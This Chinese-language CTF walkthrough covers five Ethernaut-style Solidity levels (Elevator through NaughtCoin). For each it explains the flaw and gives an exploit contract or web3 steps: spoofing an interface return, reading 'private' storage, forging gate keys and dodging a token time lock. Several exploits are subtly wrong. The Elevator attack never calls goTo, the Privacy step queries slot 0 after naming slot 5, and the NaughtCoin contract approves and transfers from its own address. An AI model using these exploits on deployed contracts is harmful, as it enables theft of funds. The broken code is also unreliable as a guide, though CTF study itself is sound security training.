# 第十一关：Elevator

## 1. 题目要求
`电梯不会让你达到大楼顶部, 对吧? `

## 2. 代码功能解读
```
Building是一个合约接口，在Elevator合约中实现了对他的调用
Elevator
	1. goTo(uint _floor)方法中，调用者要实现isLastFloor(uint)方法，并根据方法的返回值来判断是否达到顶楼。
```


## 3. 漏洞分析
```
到达顶楼就是让top的值为true。
	查看goTo方法逻辑，isLastFloor返回为false才会进入，进入后再次调用isLastFloor来设置top的值，那么我们让第一次方法返回false，第二次返回true，就可以成功实现到达顶楼。
```

## 4. 攻击方法
``` javascript
contract Exploit {

  Building build;

  bool flag = false;

  constructor(address addr) {

    build = Building(addr);

  }

  

  function Attack(uint number) public {

    build.isLastFloor(number);

  }

  

  function isLastFloor(uint) external returns (bool){

    if(!flag){

      flag = true;

      return false;

    }else {

      flag = false;

      return true;

    }

  }

}

```

## 5. 攻击调用图


# 第十二关：Privacy

### 本关知识点
```
1. 区块中的数据没有隐私性
2. 以太坊数据存储写入的两种方式
	1. strings和bytes都是大端存储，从左边开始存储数据。
	2. 其他类型数据属于小端，从右边开始存储数据。
3. 以太坊数据存储位置可计算
4. 强制类型转换
```

## 1. 题目要求
`解开这个合约来完成这一关 `

## 2. 代码功能解读
```
1. 构造器初始化的时候传入了一个大小为3的byte32字节数组，并保存到data中，data是一个私有的状态变量。
2. unlock方法通过输入一个大小为16字节的数据，判断是否等于data[2]中的前16个字节。
```


## 3. 漏洞分析
```
 让locked等于false
	 因为区块链上的数据都是透明的，所以我们可以通过请求得到data[2]中的32个字节，然后拿到16个字节后，传入unlock方法即可。
```


## 4. 攻击方法
```
web3的getStorageAt方法得到data[2]的数据
根据合约的存储规则，计算得到data[2]的槽位为：5
web3.eth.getStorageAt("vitcim地址", 0) .then(console.log);

以太坊有两种存储方式，大端（strings & bytes，从左开始）及小端（其他类型，从大开始）。因此，从32到16转换时，需要砍掉右边的16个字节。
'0xad4d68dd2ede6bf23b06d5ed3076ab0d4aae1aac23a1ebaea656ec35650d4ac3'.slice(0,34)

-----------------------------------------------------
| unused (31)    |          locked(1)               | <- slot 0
-----------------------------------------------------
|                       ID(32)                      | <- slot 1
-----------------------------------------------------
| unused (28) | awkwardness(2) |  denomination (1) | flattening(1)  | <- slot 2
-----------------------------------------------------
| data[0](32)  | <- slot 3
-----------------------------------------------------
| data[1](32)  | <- slot 4
-----------------------------------------------------
| data[2](32)  | <- slot 5
-----------------------------------------------------
```

## 5. 攻击调用图



# 第十三关：GatekeeperOne

### 本关知识点：
```
1. 类型强制转换
2. gasleft()的计算方式
3. 区分msg.sender和tx.origin
```

## 1. 题目要求
` 越过守门人并且注册为一个参赛者来完成这一关.`

## 2. 代码功能解读
```
1. 修饰器gateOne：合约调用者不等于交易的发起者
2. 修饰器gateTwo：当前剩余的gas剩余量求余8191等于0
3. 修饰器gateThree：
	1. 输入的8字节大小的数据，强转为uint64类型后再强转uint32后，仍然等于强转为uint64类型后再强转uint16
	2. 输入的8字节大小的数据，强转为uint64类型后再强转uint32后，仍然等于强转为uint64类型
	3. 输入的8字节大小的数据，强转为uint64类型后再强转uint32后，等于tx.origin强转为uint160后再强转为uint16
4. enter方法：输入的8字节数据通过以上三个修饰器的后设置entrant = tx.origin并返回true。
```


## 3. 漏洞分析
```
成功调用enter方法
	创建攻击合约调用绕开gateOne的检测
	控制gasleft使求余8191为0
	我们可以根据变量的强制转换方式，找到一个符合以上三个条件的8字节变量
```


## 4. 攻击方法
```
contract Exploit {

  GatekeeperOne one;

  // ffffffffffffffff == 000000000000ffff  >> 中间4个肯定为0

  // ffffffffffffffff != 0000000f0000ffff  >> 前8字符肯定有值

  // 0000000f0000ffff == ffffffff0000ffff(origin=)  >>

  // uint16(tx.origin000000000000-------- = _gateKey)

  uint64 number = 0xffffffff0000ffff;

  constructor(address addr) {

    one = GatekeeperOne(addr);

  }

  function attack()public {

    bytes8 value;

    value = getValue();

    one.enter(value);

  }

  function getValue() public view returns(bytes8){

    uint64 message = uint64(uint160(tx.origin));

    bytes8 sendValue = bytes8(number & message);

    return sendValue;

  }

}
```

## 5. 攻击调用图



# 第十四关：GatekeeperTwo

### 本关知识点：
```
1. 内联汇编
2. solidity的encodePacked编码方式
3. solidity的uint64最大值取值
4. 合约的创建时字节码和运行时字节码
```

## 1. 题目要求
`这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关 `

## 2. 代码功能解读
```
1. 修饰器gateOne：合约调用者不等于交易的发起者
2. 修饰器gateTwo：内联汇编判断，caller()的运行时字节码大小为0。这里的caller()等于msg.sender的地址
3. 修饰器gateThree：输入的数据做异或运算后等于uint64的最大值
```


## 3. 漏洞分析
```
成功调用enter方法
	创建一个合约来进行外部调用通过修饰器一
	通过创建一个空合约来通过修饰器二
	做异或^的算法完成修饰器三
```

## 4. 攻击方法
```
contract Exploit {

  constructor(address victim) {

    bytes8 result;

    result = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max);

    GatekeeperTwo two = GatekeeperTwo(victim);

    two.enter(result);

  }

}
```

## 5. 攻击调用图



# 第十五关：NaughtCoin

### 本关知识点：
```
1. 了解erc20代币合约
```

## 1. 题目要求
`您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。 `

## 2. 代码功能解读
```
1. 构造器初始化erc20，将INITIAL_SUPPLY数量的erc20代币mint给玩家
2. transfer方法时一个被lockTokens修饰器修饰的方法发送erc20给其他地址
3. lockTokens修饰器判断发送者是不是玩家，是的话需要等10年！其他玩家正常调用
```


## 3. 漏洞分析
```
绕过检查提前将代币发送给其他地址。
	查看引用的erc20合约，不止本人可以发送token。我们把钱授权给其他人，让其他人再转给我就行。
```

## 4. 攻击方法
``` javascript
contract Exploit {

  NaughtCoin coin;

  constructor(address addr) {

     coin = NaughtCoin(addr);

  }

  

  function attack() public {

    uint256 value = coin.balanceOf(msg.sender);

    coin.approve(address(this), value);

    coin.transfer(msg.sender, value);

  }

}
```

## 5. 攻击调用图
